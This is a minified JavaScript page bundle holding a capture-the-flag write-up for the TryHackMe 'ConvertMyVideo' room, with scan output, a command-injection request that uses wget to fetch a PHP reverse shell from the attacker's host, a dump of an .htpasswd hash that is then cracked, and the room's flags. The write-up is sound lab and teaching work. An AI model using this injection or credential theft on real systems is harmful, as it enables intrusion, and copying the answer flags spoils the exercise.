"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[8262],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function s(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function i(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var c=r.createContext({}),l=function(e){var t=r.useContext(c),n=t;return e&&(n="function"==typeof e?e(t):s(s({},t),e)),n},p=function(e){var t=l(e.components);return r.createElement(c.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},m=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,c=e.parentName,p=i(e,["components","mdxType","originalType","parentName"]),d=l(n),m=a,h=d["".concat(c,".").concat(m)]||d[m]||u[m]||o;return n?r.createElement(h,s(s({ref:t},p),{},{components:n})):r.createElement(h,s({ref:t},p))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,s=new Array(o);s[0]=m;var i={};for(var c in t)hasOwnProperty.call(t,c)&&(i[c]=t[c]);i.originalType=e,i[d]="string"==typeof e?e:a,s[1]=i;for(var l=2;l<o;l++)s[l]=n[l];return r.createElement.apply(null,s)}return r.createElement.apply(null,n)}m.displayName="MDXCreateElement"},3474:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>c,contentTitle:()=>s,default:()=>u,frontMatter:()=>o,metadata:()=>i,toc:()=>l});var r=n(87462),a=(n(67294),n(3905));const o={},s="ConvertMyVideo",i={unversionedId:"Tryhackme/ConvertMyVideo/ConvertMyVideo",id:"Tryhackme/ConvertMyVideo/ConvertMyVideo",title:"ConvertMyVideo",description:"My Script to convert videos to MP3 is super secure",source:"@site/writeups/Tryhackme/ConvertMyVideo/ConvertMyVideo.md",sourceDirName:"Tryhackme/ConvertMyVideo",slug:"/Tryhackme/ConvertMyVideo/",permalink:"/writeups/Tryhackme/ConvertMyVideo/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Common Linux Privesc",permalink:"/writeups/Tryhackme/Common Linux Privesc/"},next:{title:"Crack the hash",permalink:"/writeups/Tryhackme/Crack the hash/"}},c={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Hack the machine",id:"task-1-hack-the-machine",level:2}],p={toc:l},d="wrapper";function u(e){let{components:t,...n}=e;return(0,a.kt)(d,(0,r.Z)({},p,n,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"convertmyvideo"},"ConvertMyVideo"),(0,a.kt)("p",null,"My Script to convert videos to MP3 is super secure"),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/convertmyvideo"},"ConvertMyVideo")),(0,a.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,a.kt)("li",{parentName:"ul"},"Web Poking"),(0,a.kt)("li",{parentName:"ul"},"Remote File Inclusion"),(0,a.kt)("li",{parentName:"ul"},"Brute Forcing (Hash)")),(0,a.kt)("hr",null),(0,a.kt)("h2",{id:"task-1-hack-the-machine"},"Task 1 Hack the machine"),(0,a.kt)("p",null,"You can convert your videos - Why don't you check it out!"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ sudo nmap -p- -sS -sC -sV -O 10.10.253.245\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 22:32 CEST\nNmap scan report for 10.10.253.245\nHost is up (0.038s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)\n|   256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)\n|_  256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Site doesn't have a title (text/html; charset=UTF-8).\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/9%OT=22%CT=1%CU=33408%PV=Y%DS=2%DC=I%G=Y%TM=5F80CA9\nOS:F%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1\nOS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN\nOS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 436.23 seconds\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ gobuster dir -u 10.10.253.245 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:            http://10.10.253.245\n[+] Threads:        10\n[+] Wordlist:       /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt\n[+] Status codes:   200,204,301,302,307,401,403\n[+] User Agent:     gobuster/3.0.1\n[+] Timeout:        10s\n===============================================================\n2020/10/09 22:40:53 Starting gobuster\n===============================================================\n/.hta (Status: 403)\n/.htaccess (Status: 403)\n/.htpasswd (Status: 403)\n/admin (Status: 401)\n/images (Status: 301)\n/index.php (Status: 200)\n/js (Status: 301)\n/server-status (Status: 403)\n/tmp (Status: 301)\n===============================================================\n2020/10/09 22:41:14 Finished\n===============================================================\n")),(0,a.kt)("p",null,(0,a.kt)("a",{parentName:"p",href:"view-source:http://10.10.253.245/js/main.js"},"view-source:http://10.10.253.245/js/main.js")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-js"},'$(function () {\n  $("#convert").click(function () {\n    $("#message").html("Converting...");\n    $.post(\n      "/",\n      { yt_url: "https://www.youtube.com/watch?v=" + $("#ytid").val() },\n      function (data) {\n        try {\n          data = JSON.parse(data);\n          if (data.status == "0") {\n            $("#message").html(\n              "<a href=\'" + data.result_url + "\'>Download MP3</a>"\n            );\n          } else {\n            console.log(data);\n            $("#message").html("Oops! something went wrong");\n          }\n        } catch (error) {\n          console.log(data);\n          $("#message").html("Oops! something went wrong");\n        }\n      }\n    );\n  });\n});\n')),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"POST / HTTP/1.1\nHost: 10.10.253.245\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: http://10.10.253.245/\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\nX-Requested-With: XMLHttpRequest\nContent-Length: 67\nConnection: close\n\nyt_url=`wget${IFS}http://10.8.106.222:9001/php-reverse-shell.phtml`\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ cd /var/www/html/admin/\n$ ll\ntotal 24\ndrwxr-xr-x 2 www-data www-data 4096 Apr 12 05:05 .\ndrwxr-xr-x 6 www-data www-data 4096 Jun 15 15:34 ..\n-rw-r--r-- 1 www-data www-data   98 Apr 12 03:55 .htaccess\n-rw-r--r-- 1 www-data www-data   49 Apr 12 04:02 .htpasswd\n-rw-r--r-- 1 www-data www-data   39 Apr 12 05:05 flag.txt\n-rw-rw-r-- 1 www-data www-data  202 Apr 12 04:18 index.php\n$ cat .htpasswd\nitsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/ConvertMyVideo$ john hash\nWarning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"\nUse the "--format=md5crypt-long" option to force loading these as that type instead\nUsing default input encoding: UTF-8\nLoaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3])\nWill run 2 OpenMP threads\nProceeding with single, rules:Single\nPress \'q\' or Ctrl-C to abort, almost any other key for status\nWarning: Only 36 candidates buffered for the current salt, minimum 48 needed for performance.\nWarning: Only 45 candidates buffered for the current salt, minimum 48 needed for performance.\nAlmost done: Processing the remaining buffered candidate passwords, if any.\nWarning: Only 32 candidates buffered for the current salt, minimum 48 needed for performance.\nProceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist\njessie           (itsmeadmin)\n1g 0:00:00:00 DONE 2/3 (2020-10-09 22:57) 6.250g/s 11406p/s 11406c/s 11406C/s bigdog..me\nUse the "--show" option to display all of the cracked passwords reliably\nSession completed\n')),(0,a.kt)("ol",null,(0,a.kt)("li",{parentName:"ol"},"What is the name of the secret folder?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"admin")),(0,a.kt)("ol",{start:2},(0,a.kt)("li",{parentName:"ol"},"What is the user to access the secret folder?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"itsmeadmin")),(0,a.kt)("ol",{start:3},(0,a.kt)("li",{parentName:"ol"},"What is the user flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{0d8486a0c0c42503bb60ac77f4046ed7}")),(0,a.kt)("ol",{start:4},(0,a.kt)("li",{parentName:"ol"},"What is the root flag?")),(0,a.kt)("p",null,(0,a.kt)("inlineCode",{parentName:"p"},"flag{d9b368018e912b541a4eb68399c5e94a}")))}u.isMDXComponent=!0}}]);